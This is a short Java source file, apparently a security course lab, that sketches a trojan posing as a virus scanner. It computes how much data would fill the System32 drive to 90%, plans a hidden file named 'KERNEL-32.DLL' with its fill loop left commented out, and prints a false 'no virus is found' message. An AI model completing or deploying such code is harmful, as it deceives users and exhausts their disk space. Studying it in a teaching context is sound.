package csci476.lab3;
import java.io.*;
public class Main {

    public static void main(String[] args) {
	// write your code here
        File rootDrive = new File("/Windows/System32");
        //set the rootDrive to be System32, i have %systemroot% that way because I assume that will work
        long rootDriveTotalSize = rootDrive.getTotalSpace();
        //retrieves the total space of System 32
        long rootDriveFillableSize = (long)(rootDriveTotalSize*.90)-rootDrive.getUsableSpace();
        //calculates 90% of space of drive and removes free space so you get the amount of space needed to make the drive 90% full.

        //create hidden dummy .dll file KERNEL-32.DLL

        System.out.println("Tota disk size: "+ rootDriveTotalSize);
        System.out.println("Usable space: "+ rootDrive.getUsableSpace());
        System.out.println("size to be filled up: " + rootDriveFillableSize);
        //The above three lines are for debugging.



        /*
        while(DLL <= rootDriveFillableSize){
            //write stuff to the file.
        }


        */
        System.out.println("The scanning finished and no virus is found!");
        //tell the user they have no viruses.
    }
}
